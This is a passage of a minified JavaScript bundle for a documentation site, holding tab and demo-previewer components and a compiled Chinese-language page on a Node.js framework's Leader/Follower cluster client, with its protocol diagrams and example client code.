Pt=["id","prefixCls","className","children","direction","activeKey","defaultActiveKey","editable","animated","tabPosition","tabBarGutter","tabBarStyle","tabBarExtraContent","locale","moreIcon","moreTransitionName","destroyInactiveTabPane","renderTabBar","onChange","onTabClick","onTabScroll","getPopupContainer","popupClassName"],Rt=0;function _t(e){return Object(p["a"])(e).map((function(e){if(a["isValidElement"](e)){var t=void 0!==e.key?String(e.key):void 0;return Object(u["a"])(Object(u["a"])({key:t},e.props),{},{node:e})}return null})).filter((function(e){return e}))}function qt(e,t){var n,r,d=e.id,p=e.prefixCls,f=void 0===p?"rc-tabs":p,E=e.className,b=e.children,v=e.direction,y=e.activeKey,k=e.defaultActiveKey,w=e.editable,x=e.animated,j=void 0===x?{inkBar:!0,tabPane:!1}:x,S=e.tabPosition,C=void 0===S?"top":S,A=e.tabBarGutter,L=e.tabBarStyle,T=e.tabBarExtraContent,N=e.locale,O=e.moreIcon,I=e.moreTransitionName,P=e.destroyInactiveTabPane,R=e.renderTabBar,_=e.onChange,q=e.onTabClick,M=e.onTabScroll,F=e.getPopupContainer,D=e.popupClassName,U=Object(s["a"])(e,Pt),z=_t(b),H="rtl"===v;r=!1===j?{inkBar:!1,tabPane:!1}:!0===j?{inkBar:!0,tabPane:!0}:Object(u["a"])({inkBar:!0,tabPane:!1},"object"===Object(c["a"])(j)?j:{});var B=Object(a["useState"])(!1),W=Object(i["a"])(B,2),V=W[0],$=W[1];Object(a["useEffect"])((function(){$(Object(h["a"])())}),[]);var G=Object(g["a"])((function(){var e;return null===(e=z[0])||void 0===e?void 0:e.key}),{value:y,defaultValue:k}),X=Object(i["a"])(G,2),Q=X[0],K=X[1],J=Object(a["useState"])((function(){return z.findIndex((function(e){return e.key===Q}))})),Y=Object(i["a"])(J,2),Z=Y[0],ee=Y[1];Object(a["useEffect"])((function(){var e,t=z.findIndex((function(e){return e.key===Q}));-1===t&&(t=Math.max(0,Math.min(Z,z.length-1)),K(null===(e=z[t])||void 0===e?void 0:e.key));ee(t)}),[z.map((function(e){return e.key})).join("_"),Q,Z]);var te=Object(g["a"])(null,{value:d}),ne=Object(i["a"])(te,2),ae=ne[0],re=ne[1],le=C;function oe(e,t){null===q||void 0===q||q(e,t);var n=e!==Q;K(e),n&&(null===_||void 0===_||_(e))}V&&!["left","right"].includes(C)&&(le="top"),Object(a["useEffect"])((function(){d||(re("rc-tabs-".concat(Rt)),Rt+=1)}),[]);var ie,ce={id:ae,activeKey:Q,animated:r,tabPosition:le,rtl:H,mobile:V},se=Object(u["a"])(Object(u["a"])({},ce),{},{editable:w,locale:N,moreIcon:O,moreTransitionName:I,tabBarGutter:A,onTabClick:oe,onTabScroll:M,extra:T,style:L,panes:b,getPopupContainer:F,popupClassName:D});return ie=R?R(se,Nt):a["createElement"](Nt,se),a["createElement"](yt.Provider,{value:{tabs:z,prefixCls:f}},a["createElement"]("div",Object(l["a"])({ref:t,id:d,className:m()(f,"".concat(f,"-").concat(le),(n={},Object(o["a"])(n,"".concat(f,"-mobile"),V),Object(o["a"])(n,"".concat(f,"-editable"),w),Object(o["a"])(n,"".concat(f,"-rtl"),H),n),E)},U),ie,a["createElement"](Ot,Object(l["a"])({destroyInactiveTabPane:P},ce,{animated:r}))))}var Mt=a["forwardRef"](qt);Mt.TabPane=It;var Ft=Mt,Dt=Ft,Ut=n("eYjw"),zt=n("zzMO"),Ht=n("j00X"),Bt=n("P/fr"),Wt=n("POLX");n("43P3");function Vt(e,t){return Kt(e)||Qt(e,t)||Gt(e,t)||$t()}function $t(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function Gt(e,t){if(e){if("string"===typeof e)return Xt(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?Xt(e,t):void 0}}function Xt(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}function Qt(e,t){var n=null==e?null:"undefined"!==typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=n){var a,r,l=[],o=!0,i=!1;try{for(n=n.call(e);!(o=(a=n.next()).done);o=!0)if(l.push(a.value),t&&l.length===t)break}catch(c){i=!0,r=c}finally{try{o||null==n["return"]||n["return"]()}finally{if(i)throw r}}return l}}function Kt(e){if(Array.isArray(e))return e}function Jt(e,t){var n,a=null===(n=e.match(/\.(\w+)$/))||void 0===n?void 0:n[1];return a||(a=t.tsx?"tsx":"jsx"),a}var Yt=function(e){var t,n,l,o=Object(a["useRef"])(),i=Object(a["useContext"])(Ht["context"]),c=i.locale,s=Object(Ht["useLocaleProps"])(c,e),u=Object(Ht["useDemoUrl"])(s.identifier),d=s.demoUrl||u,m=(null===zt["a"]||void 0===zt["a"]?void 0:zt["a"].location.hash)==="#".concat(s.identifier),p=1===Object.keys(s.sources).length,h=Object(Ht["useCodeSandbox"])((null===(t=s.hideActions)||void 0===t?void 0:t.includes("CSB"))?null:s),g=Object(Ht["useRiddle"])((null===(n=s.hideActions)||void 0===n?void 0:n.includes("RIDDLE"))?null:s),f=Object(Ht["useMotions"])(s.motions||[],o.current),E=Vt(f,2),b=E[0],v=E[1],y=Object(Ht["useCopy"])(),k=Vt(y,2),w=k[0],x=k[1],j=Object(a["useState"])((function(){return s.sources._?"_":Object.keys(s.sources)[0]})),S=Vt(j,2),C=S[0],A=S[1],L=Object(a["useState"])(Jt(C,s.sources[C])),T=Vt(L,2),N=T[0],O=T[1],I=Object(a["useState"])(Boolean(s.defaultShowCode)),P=Vt(I,2),R=P[0],_=P[1],q=Object(a["useState"])(Math.random()),M=Vt(q,2),F=M[0],D=M[1],U=s.sources[C][N]||s.sources[C].content,z=Object(Ht["useTSPlaygroundUrl"])(c,U),H=Object(a["useRef"])(),B=Object(Ht["usePrefersColor"])(),W=Vt(B,1),V=W[0],$=s.actionBarRender,G=void 0===$?function(e){return e}:$;function X(e){A(e),O(Jt(e,s.sources[e]))}return Object(a["useEffect"])((function(){D(Math.random())}),[V]),r.a.createElement("div",{style:s.style,className:[s.className,"__dumi-default-previewer",m?"__dumi-default-previewer-target":""].filter(Boolean).join(" "),id:s.identifier,"data-debug":s.debug||void 0,"data-iframe":s.iframe||void 0},s.iframe&&r.a.createElement("div",{className:"__dumi-default-previewer-browser-nav"}),r.a.createElement("div",{ref:o,className:"__dumi-default-previewer-demo",style:{transform:s.transform?"translate(0, 0)":void 0,padding:s.compact||s.iframe&&!1!==s.compact?"0":void 0,background:s.background}},s.iframe?r.a.createElement("iframe",{title:"dumi-previewer",style:{height:String(s.iframe).replace(/(\d)$/,"$1px")},key:F,src:d,ref:H}):r.a.createElement(Ut["ErrorBoundary"],{fallbackRender:function(e){var t=e.error;return r.a.createElement(Wt["a"],{type:"error"},r.a.createElement("h4",null,t.message||"This demo has been crashed."),t.stack&&r.a.createElement("details",null,r.a.createElement("summary",null,"Error stack"),r.a.createElement("pre",null,t.stack)))}},s.children)),r.a.createElement("div",{className:"__dumi-default-previewer-desc","data-title":s.title},s.title&&r.a.createElement(Ht["AnchorLink"],{to:"#".concat(s.identifier)},s.title),s.description&&r.a.createElement("div",{dangerouslySetInnerHTML:{__html:s.description}})),r.a.createElement("div",{className:"__dumi-default-previewer-actions"},G(r.a.createElement(r.a.Fragment,null,h&&r.a.createElement("button",{title:"Open demo on CodeSandbox.io",className:"__dumi-default-icon",role:"codesandbox",onClick:h}),g&&r.a.createElement("button",{title:"Open demo on Riddle",className:"__dumi-default-icon",role:"riddle",onClick:g}),s.motions&&r.a.createElement("button",{title:"Execute motions",className:"__dumi-default-icon",role:"motions",disabled:v,onClick:function(){return b()}}),s.iframe&&r.a.createElement("button",{title:"Reload demo iframe page",className:"__dumi-default-icon",role:"refresh",onClick:function(){return D(Math.random())}}),!(null===(l=s.hideActions)||void 0===l?void 0:l.includes("EXTERNAL"))&&r.a.createElement(Ht["Link"],{target:"_blank",to:d},r.a.createElement("button",{title:"Open demo in new tab",className:"__dumi-default-icon",role:"open-demo",type:"button"})),r.a.createElement("span",null),r.a.createElement("button",{title:"Copy source code",className:"__dumi-default-icon",role:"copy","data-status":x,onClick:function(){return w(U)}}),"tsx"===N&&R&&r.a.createElement(Ht["Link"],{target:"_blank",to:z},r.a.createElement("button",{title:"Get JSX via TypeScript Playground",className:"__dumi-default-icon",role:"change-tsx",type:"button"})),r.a.createElement("button",{title:"Toggle source code panel",className:"__dumi-default-icon".concat(R?" __dumi-default-btn-expand":""),role:"source",type:"button",onClick:function(){return _(!R)}})))),R&&r.a.createElement("div",{className:"__dumi-default-previewer-source-wrapper"},!p&&r.a.createElement(Dt,{className:"__dumi-default-previewer-source-tab",prefixCls:"__dumi-default-tabs",moreIcon:"\xb7\xb7\xb7",defaultActiveKey:C,onChange:X},Object.keys(s.sources).map((function(e){return r.a.createElement(It,{tab:"_"===e?"index.".concat(Jt(e,s.sources[e])):e,key:e})}))),r.a.createElement("div",{className:"__dumi-default-previewer-source"},r.a.createElement(Bt["a"],{code:U,lang:N,showCopy:!1}))))};t["default"]=Yt},"83wk":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=n("3dEy"),c=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u5728\u524d\u9762\u7684",r.a.createElement(l["Link"],{to:"../core/cluster-and-ipc"},"\u591a\u8fdb\u7a0b\u6a21\u578b\u7ae0\u8282"),"\u4e2d\uff0c\u6211\u4eec\u8be6\u7ec6\u8bb2\u8ff0\u4e86\u6846\u67b6\u7684\u591a\u8fdb\u7a0b\u6a21\u578b\uff0c\u5176\u4e2d\u9002\u5408\u4f7f\u7528 Agent \u8fdb\u7a0b\u7684\u6709\u4e00\u7c7b\u5e38\u89c1\u7684\u573a\u666f\uff1a\u4e00\u4e9b\u4e2d\u95f4\u4ef6\u5ba2\u6237\u7aef\u9700\u8981\u548c\u670d\u52a1\u5668\u5efa\u7acb\u957f\u8fde\u63a5\uff0c\u7406\u8bba\u4e0a\u4e00\u53f0\u670d\u52a1\u5668\u6700\u597d\u53ea\u5efa\u7acb\u4e00\u4e2a\u957f\u8fde\u63a5\uff0c\u4f46\u591a\u8fdb\u7a0b\u6a21\u578b\u4f1a\u5bfc\u81f4 n \u500d\uff08n = Worker \u8fdb\u7a0b\u6570\uff09\u8fde\u63a5\u88ab\u521b\u5efa\u3002"),r.a.createElement(o["a"],{code:"+--------+   +--------+\n| Client |   | Client |   ... n\n+--------+   +--------+\n    |  \\     /   |\n    |    \\ /     |        n * m \u4e2a\u94fe\u63a5\n    |    / \\     |\n    |  /     \\   |\n+--------+   +--------+\n| Server |   | Server |   ... m\n+--------+   +--------+",lang:"bash"}),r.a.createElement("p",null,"\u4e3a\u4e86\u5c3d\u53ef\u80fd\u7684\u590d\u7528\u957f\u8fde\u63a5\uff08\u56e0\u4e3a\u5b83\u4eec\u5bf9\u4e8e\u670d\u52a1\u7aef\u6765\u8bf4\u662f\u975e\u5e38\u5b9d\u8d35\u7684\u8d44\u6e90\uff09\uff0c\u6211\u4eec\u4f1a\u628a\u5b83\u653e\u5230 Agent \u8fdb\u7a0b\u91cc\u7ef4\u62a4\uff0c\u7136\u540e\u901a\u8fc7 messenger \u5c06\u6570\u636e\u4f20\u9012\u7ed9\u5404\u4e2a Worker\u3002\u8fd9\u79cd\u505a\u6cd5\u662f\u53ef\u884c\u7684\uff0c\u4f46\u662f\u5f80\u5f80\u9700\u8981\u5199\u5927\u91cf\u4ee3\u7801\u53bb\u5c01\u88c5\u63a5\u53e3\u548c\u5b9e\u73b0\u6570\u636e\u7684\u4f20\u9012\uff0c\u975e\u5e38\u9ebb\u70e6\u3002"),r.a.createElement("p",null,"\u53e6\u5916\uff0c\u901a\u8fc7 messenger \u4f20\u9012\u6570\u636e\u6548\u7387\u662f\u6bd4\u8f83\u4f4e\u7684\uff0c\u56e0\u4e3a\u5b83\u4f1a\u901a\u8fc7 Master \u6765\u505a\u4e2d\u8f6c\uff1b\u4e07\u4e00 IPC \u901a\u9053\u51fa\u73b0\u95ee\u9898\u8fd8\u53ef\u80fd\u5c06 Master \u8fdb\u7a0b\u641e\u6302\u3002"),r.a.createElement("p",null,"\u90a3\u4e48\u6709\u6ca1\u6709\u66f4\u597d\u7684\u65b9\u6cd5\u5462\uff1f\u7b54\u6848\u662f\u80af\u5b9a\u7684\uff0c\u6211\u4eec\u63d0\u4f9b\u4e00\u79cd\u65b0\u7684\u6a21\u5f0f\u6765\u964d\u4f4e\u8fd9\u7c7b\u5ba2\u6237\u7aef\u5c01\u88c5\u7684\u590d\u6742\u5ea6\u3002\u901a\u8fc7\u5efa\u7acb Agent \u548c Worker \u7684 socket \u76f4\u8fde\u8df3\u8fc7 Master \u7684\u4e2d\u8f6c\u3002Agent \u4f5c\u4e3a\u5bf9\u5916\u7684\u95e8\u9762\u7ef4\u6301\u591a\u4e2a Worker \u8fdb\u7a0b\u7684\u5171\u4eab\u8fde\u63a5\u3002"),r.a.createElement("h2",{id:"\u6838\u5fc3\u601d\u60f3"},r.a.createElement(l["AnchorLink"],{to:"#\u6838\u5fc3\u601d\u60f3","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6838\u5fc3\u601d\u60f3"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u53d7\u5230 ",r.a.createElement(l["Link"],{to:"https://www.dre.vanderbilt.edu/~schmidt/PDF/lf.pdf"},"Leader/Follower")," \u6a21\u5f0f\u7684\u542f\u53d1\u3002"),r.a.createElement("li",null,"\u5ba2\u6237\u7aef\u4f1a\u88ab\u533a\u5206\u4e3a\u4e24\u79cd\u89d2\u8272\uff1a",r.a.createElement("ul",null,r.a.createElement("li",null,"Leader: \u8d1f\u8d23\u548c\u8fdc\u7a0b\u670d\u52a1\u7aef\u7ef4\u6301\u8fde\u63a5\uff0c\u5bf9\u4e8e\u540c\u4e00\u7c7b\u7684\u5ba2\u6237\u7aef\u53ea\u6709\u4e00\u4e2a Leader\u3002"),r.a.createElement("li",null,"Follower: \u4f1a\u5c06\u5177\u4f53\u7684\u64cd\u4f5c\u59d4\u6258\u7ed9 Leader\uff0c\u5e38\u89c1\u7684\u662f\u8ba2\u9605\u6a21\u578b\uff08\u8ba9 Leader \u548c\u8fdc\u7a0b\u670d\u52a1\u7aef\u4ea4\u4e92\uff0c\u5e76\u7b49\u5f85\u5176\u8fd4\u56de\uff09\u3002"))),r.a.createElement("li",null,"\u5982\u4f55\u786e\u5b9a\u8c01\u662f Leader\uff0c\u8c01\u662f Follower \u5462\uff1f\u6709\u4e24\u79cd\u6a21\u5f0f\uff1a",r.a.createElement("ul",null,r.a.createElement("li",null,"\u81ea\u7531\u7ade\u4e89\u6a21\u5f0f\uff1a\u5ba2\u6237\u7aef\u542f\u52a8\u7684\u65f6\u5019\u901a\u8fc7\u672c\u5730\u7aef\u53e3\u7684\u4e89\u593a\u6765\u786e\u5b9a Leader\u3002\u4f8b\u5982\uff1a\u5927\u5bb6\u90fd\u5c1d\u8bd5\u76d1\u542c 7777 \u7aef\u53e3\uff0c\u6700\u540e\u53ea\u4f1a\u6709\u4e00\u4e2a\u5b9e\u4f8b\u62a2\u5360\u5230\uff0c\u90a3\u5b83\u5c31\u53d8\u6210 Leader\uff0c\u5176\u4f59\u7684\u90fd\u662f Follower\u3002"),r.a.createElement("li",null,"\u5f3a\u5236\u6307\u5b9a\u6a21\u5f0f\uff1a\u6846\u67b6\u6307\u5b9a\u67d0\u4e00\u4e2a Leader\uff0c\u5176\u4f59\u7684\u5c31\u662f Follower\u3002"))),r.a.createElement("li",null,"\u6846\u67b6\u91cc\u9762\u6211\u4eec\u91c7\u7528\u7684\u662f\u5f3a\u5236\u6307\u5b9a\u6a21\u5f0f\uff0cLeader \u53ea\u80fd\u5728 Agent \u91cc\u9762\u521b\u5efa\uff0c\u8fd9\u4e5f\u7b26\u5408\u6211\u4eec\u5bf9 Agent \u7684\u5b9a\u4f4d"),r.a.createElement("li",null,"\u6846\u67b6\u542f\u52a8\u7684\u65f6\u5019 Master \u4f1a\u968f\u673a\u9009\u62e9\u4e00\u4e2a\u53ef\u7528\u7684\u7aef\u53e3\u4f5c\u4e3a Cluster Client \u76d1\u542c\u7684\u901a\u8baf\u7aef\u53e3\uff0c\u5e76\u5c06\u5b83\u901a\u8fc7\u53c2\u6570\u4f20\u9012\u7ed9 Agent \u548c App Worker\u3002"),r.a.createElement("li",null,"Leader \u548c Follower \u4e4b\u95f4\u901a\u8fc7 socket \u76f4\u8fde\uff08\u901a\u8fc7\u901a\u8baf\u7aef\u53e3\uff09\uff0c\u4e0d\u518d\u9700\u8981 Master \u4e2d\u8f6c\u3002")),r.a.createElement("p",null,"\u65b0\u7684\u6a21\u5f0f\u4e0b\uff0c\u5ba2\u6237\u7aef\u7684\u901a\u4fe1\u65b9\u5f0f\u5982\u4e0b\uff1a"),r.a.createElement(o["a"],{code:"+-------+\n             | start |\n             +---+---+\n                 |\n        +--------+---------+\n      __| port competition |__\nwin /   +------------------+  \\ lose\n   /                           \\\n+---------------+     tcp conn     +-------------------+\n| Leader(Agent) |<----------------\x3e| Follower(Worker1) |\n+---------------+                  +-------------------+\n    |            \\ tcp conn\n    |             \\\n+--------+         +-------------------+\n| Client |         | Follower(Worker2) |\n+--------+         +-------------------+",lang:"js"}),r.a.createElement("h2",{id:"\u5ba2\u6237\u7aef\u63a5\u53e3\u7c7b\u578b\u62bd\u8c61"},r.a.createElement(l["AnchorLink"],{to:"#\u5ba2\u6237\u7aef\u63a5\u53e3\u7c7b\u578b\u62bd\u8c61","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5ba2\u6237\u7aef\u63a5\u53e3\u7c7b\u578b\u62bd\u8c61"),r.a.createElement("p",null,"\u6211\u4eec\u5c06\u5ba2\u6237\u7aef\u63a5\u53e3\u62bd\u8c61\u4e3a\u4e0b\u9762\u4e24\u5927\u7c7b\uff0c\u8fd9\u4e5f\u662f\u5bf9\u5ba2\u6237\u7aef\u63a5\u53e3\u7684\u4e00\u4e2a\u89c4\u8303\uff0c\u5bf9\u4e8e\u7b26\u5408\u89c4\u8303\u7684\u5ba2\u6237\u7aef\uff0c\u6211\u4eec\u53ef\u4ee5\u81ea\u52a8\u5c06\u5176\u5305\u88c5\u4e3a Leader/Follower \u6a21\u5f0f\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u8ba2\u9605\u3001\u53d1\u5e03\u7c7b\uff08subscribe / publish\uff09\uff1a",r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"subscribe(info, listener)")," \u63a5\u53e3\u5305\u542b\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u8ba2\u9605\u7684\u4fe1\u606f\uff0c\u7b2c\u4e8c\u4e2a\u662f\u8ba2\u9605\u7684\u56de\u8c03\u51fd\u6570\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"publish(info)")," \u63a5\u53e3\u5305\u542b\u4e00\u4e2a\u53c2\u6570\uff0c\u5c31\u662f\u8ba2\u9605\u7684\u4fe1\u606f\u3002"))),r.a.createElement("li",null,"\u8c03\u7528\u7c7b (invoke)\uff0c\u652f\u6301 callback, promise \u548c generator function \u4e09\u79cd\u98ce\u683c\u7684\u63a5\u53e3\uff0c\u4f46\u662f\u63a8\u8350\u4f7f\u7528 generator function\u3002")),r.a.createElement("p",null,"\u5ba2\u6237\u7aef\u793a\u4f8b"),r.a.createElement(o["a"],{code:"const Base = require('sdk-base');\n\nclass Client extends Base {\n  constructor(options) {\n    super(options);\n    // \u5728\u521d\u59cb\u5316\u6210\u529f\u4ee5\u540e\u8bb0\u5f97 ready\n    this.ready(true);\n  }\n\n  /**\n   * \u8ba2\u9605\n   *\n   * @param {Object} info - \u8ba2\u9605\u7684\u4fe1\u606f\uff08\u4e00\u4e2a JSON \u5bf9\u8c61\uff0c\u6ce8\u610f\u5c3d\u91cf\u4e0d\u8981\u5305\u542b Function, Buffer, Date \u8fd9\u7c7b\u5c5e\u6027\uff09\n   * @param {Function} listener - \u76d1\u542c\u7684\u56de\u8c03\u51fd\u6570\uff0c\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\u5c31\u662f\u76d1\u542c\u5230\u7684\u7ed3\u679c\u5bf9\u8c61\n   */\n  subscribe(info, listener) {\n    // ...\n  }\n\n  /**\n   * \u53d1\u5e03\n   *\n   * @param {Object} info - \u53d1\u5e03\u7684\u4fe1\u606f\uff0c\u548c\u4e0a\u9762 subscribe \u7684 info \u7c7b\u4f3c\n   */\n  publish(info) {\n    // ...\n  }\n\n  /**\n   * \u83b7\u53d6\u6570\u636e (invoke)\n   *\n   * @param {String} id - id\n   * @return {Object} result\n   */\n  async getData(id) {\n    // ...\n  }\n}",lang:"js"}),r.a.createElement("h2",{id:"\u5f02\u5e38\u5904\u7406"},r.a.createElement(l["AnchorLink"],{to:"#\u5f02\u5e38\u5904\u7406","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5f02\u5e38\u5904\u7406"),r.a.createElement("ul",null,r.a.createElement("li",null,"Leader \u5982\u679c\u201c\u6b7b\u6389\u201d\u4f1a\u89e6\u53d1\u65b0\u4e00\u8f6e\u7684\u7aef\u53e3\u4e89\u593a\uff0c\u4e89\u593a\u5230\u7aef\u53e3\u7684\u90a3\u4e2a\u5b9e\u4f8b\u88ab\u63a8\u9009\u4e3a\u65b0\u7684 Leader\u3002"),r.a.createElement("li",null,"\u4e3a\u4fdd\u8bc1 Leader \u548c Follower \u4e4b\u95f4\u7684\u901a\u9053\u5065\u5eb7\uff0c\u9700\u8981\u5f15\u5165\u5b9a\u65f6\u5fc3\u8df3\u68c0\u67e5\u673a\u5236\uff0c\u5982\u679c Follower \u5728\u56fa\u5b9a\u65f6\u95f4\u5185\u6ca1\u6709\u53d1\u9001\u5fc3\u8df3\u5305\uff0c\u90a3\u4e48 Leader \u4f1a\u5c06 Follower \u4e3b\u52a8\u65ad\u5f00\uff0c\u4ece\u800c\u89e6\u53d1 Follower \u7684\u91cd\u65b0\u521d\u59cb\u5316\u3002")),r.a.createElement("h2",{id:"\u534f\u8bae\u548c\u8c03\u7528\u65f6\u5e8f"},r.a.createElement(l["AnchorLink"],{to:"#\u534f\u8bae\u548c\u8c03\u7528\u65f6\u5e8f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u534f\u8bae\u548c\u8c03\u7528\u65f6\u5e8f"),r.a.createElement("p",null,"Leader \u548c Follower \u901a\u8fc7\u4e0b\u9762\u7684\u534f\u8bae\u8fdb\u884c\u6570\u636e\u4ea4\u6362\uff1a"),r.a.createElement(o["a"],{code:"0       1       2               4                                                              12\n +-------+-------+---------------+---------------------------------------------------------------+\n |version|req/res|    reserved   |                          request id                           |\n +-------------------------------+-------------------------------+-------------------------------+\n |           timeout             |   connection object length    |   application object length   |\n +-------------------------------+---------------------------------------------------------------+\n |         conn object (JSON format)  ...                    |            app object             |\n +-----------------------------------------------------------+                                   |\n |                                          ...                                                  |\n +-----------------------------------------------------------------------------------------------+",lang:"js"}),r.a.createElement("ol",null,r.a.createElement("li",null,"\u5728\u901a\u8baf\u7aef\u53e3\u4e0a Leader \u542f\u52a8\u4e00\u4e2a Local Server\uff0c\u6240\u6709\u7684 Leader/Follower \u901a\u8baf\u90fd\u7ecf\u8fc7 Local Server\u3002"),r.a.createElement("li",null,"Follower \u8fde\u63a5\u4e0a Local Server \u540e\uff0c\u9996\u5148\u53d1\u9001\u4e00\u4e2a register channel \u7684 packet\uff08\u5f15\u5165 channel \u7684\u6982\u5ff5\u662f\u4e3a\u4e86\u533a\u522b\u4e0d\u540c\u7c7b\u578b\u7684\u5ba2\u6237\u7aef\uff09\u3002"),r.a.createElement("li",null,"Local Server \u4f1a\u5c06 Follower \u5206\u914d\u7ed9\u6307\u5b9a\u7684 Leader\uff08\u6839\u636e\u5ba2\u6237\u7aef\u7c7b\u578b\u8fdb\u884c\u914d\u5bf9\uff09\u3002"),r.a.createElement("li",null,"Follower \u5411 Leader \u53d1\u9001\u8ba2\u9605\u3001\u53d1\u5e03\u8bf7\u6c42\u3002"),r.a.createElement("li",null,"Leader \u5728\u8ba2\u9605\u6570\u636e\u53d8\u66f4\u65f6\u901a\u8fc7 subscribe result packet \u901a\u77e5 Follower\u3002"),r.a.createElement("li",null,"Follower \u5411 Leader \u53d1\u9001\u8c03\u7528\u8bf7\u6c42\uff0cLeader \u6536\u5230\u540e\u6267\u884c\u76f8\u5e94\u64cd\u4f5c\u540e\u8fd4\u56de\u7ed3\u679c\u3002")),r.a.createElement(o["a"],{code:"+----------+             +---------------+          +---------+\n | Follower |             |  Local Server |          |  Leader |\n +----------+             +---------------+          +---------+\n      |     register channel     |       assign to        |\n      + -----------------------\x3e |  --------------------\x3e |\n      |                          |                        |\n      |                                subscribe          |\n      + ------------------------------------------------\x3e |\n      |                                 publish           |\n      + ------------------------------------------------\x3e |\n      |                                                   |\n      |       subscribe result                            |\n      | <------------------------------------------------ +\n      |                                                   |\n      |                                 invoke            |\n      + ------------------------------------------------\x3e |\n      |          invoke result                            |\n      | <------------------------------------------------ +\n      |                                                   |",lang:"js"}),r.a.createElement("h2",{id:"\u5177\u4f53\u7684\u4f7f\u7528\u65b9\u6cd5"},r.a.createElement(l["AnchorLink"],{to:"#\u5177\u4f53\u7684\u4f7f\u7528\u65b9\u6cd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5177\u4f53\u7684\u4f7f\u7528\u65b9\u6cd5"),r.a.createElement("p",null,"\u4e0b\u9762\u6211\u7528\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u4ecb\u7ecd\u5728\u6846\u67b6\u91cc\u9762\u5982\u4f55\u8ba9\u4e00\u4e2a\u5ba2\u6237\u7aef\u652f\u6301 Leader/Follower \u6a21\u5f0f\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u7b2c\u4e00\u6b65\uff0c\u6211\u4eec\u7684\u5ba2\u6237\u7aef\u6700\u597d\u662f\u7b26\u5408\u4e0a\u9762\u63d0\u5230\u8fc7\u7684\u63a5\u53e3\u7ea6\u5b9a\uff0c\u4f8b\u5982\uff1a")),r.a.createElement(o["a"],{code:"// registry_client.js\nconst URL = require('url');\nconst Base = require('sdk-base');\n\nclass RegistryClient extends Base {\n  constructor(options) {\n    super({\n      // \u6307\u5b9a\u5f02\u6b65\u542f\u52a8\u7684\u65b9\u6cd5\n      initMethod: 'init',\n    });\n    this._options = options;\n    this._registered = new Map();\n  }\n\n  /**\n   * \u542f\u52a8\u903b\u8f91\n   */\n  async init() {\n    this.ready(true);\n  }\n\n  /**\n   * \u83b7\u53d6\u914d\u7f6e\n   * @param {String} dataId - the dataId\n   * @return {Object} \u914d\u7f6e\n   */\n  async getConfig(dataId) {\n    return this._registered.get(dataId);\n  }\n\n  /**\n   * \u8ba2\u9605\n   * @param {Object} reg\n   *   - {String} dataId - the dataId\n   * @param {Function}  listener - the listener\n   */\n  subscribe(reg, listener) {\n    const key = reg.dataId;\n    this.on(key, listener);\n\n    const data = this._registered.get(key);\n    if (data) {\n      process.nextTick(() => listener(data));\n    }\n  }\n\n  /**\n   * \u53d1\u5e03\n   * @param {Object} reg\n   *   - {String} dataId - the dataId\n   *   - {String} publishData - the publish data\n   */\n  publish(reg) {\n    const key = reg.dataId;\n    let changed = false;\n\n    if (this._registered.has(key)) {\n      const arr = this._registered.get(key);\n      if (arr.indexOf(reg.publishData) === -1) {\n        changed = true;\n        arr.push(reg.publishData);\n      }\n    } else {\n      changed = true;\n      this._registered.set(key, [reg.publishData]);\n    }\n    if (changed) {\n      this.emit(\n        key,\n        this._registered.get(key).map((url) => URL.parse(url, true)),\n      );\n    }\n  }\n}\n\nmodule.exports = RegistryClient;",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"\u7b2c\u4e8c\u6b65\uff0c\u4f7f\u7528 ",r.a.createElement("code",null,"agent.cluster")," \u63a5\u53e3\u5bf9 ",r.a.createElement("code",null,"RegistryClient")," \u8fdb\u884c\u5c01\u88c5\uff1a")),r.a.createElement(o["a"],{code:"// agent.js\nconst RegistryClient = require('registry_client');\n\nmodule.exports = (agent) => {\n  // \u5bf9 RegistryClient \u8fdb\u884c\u5c01\u88c5\u548c\u5b9e\u4f8b\u5316\n  agent.registryClient = agent\n    .cluster(RegistryClient)\n    // create \u65b9\u6cd5\u7684\u53c2\u6570\u5c31\u662f RegistryClient \u6784\u9020\u51fd\u6570\u7684\u53c2\u6570\n    .create({});\n\n  agent.beforeStart(async () => {\n    await agent.registryClient.ready();\n    agent.coreLogger.info('registry client is ready');\n  });\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"\u7b2c\u4e09\u6b65\uff0c\u4f7f\u7528 ",r.a.createElement("code",null,"app.cluster")," \u63a5\u53e3\u5bf9 ",r.a.createElement("code",null,"RegistryClient")," \u8fdb\u884c\u5c01\u88c5\uff1a")),r.a.createElement(o["a"],{code:"// app.js\nconst RegistryClient = require('registry_client');\n\nmodule.exports = (app) => {\n  app.registryClient = app.cluster(RegistryClient).create({});\n  app.beforeStart(async () => {\n    await app.registryClient.ready();\n    app.coreLogger.info('registry client is ready');\n\n    // \u8c03\u7528 subscribe 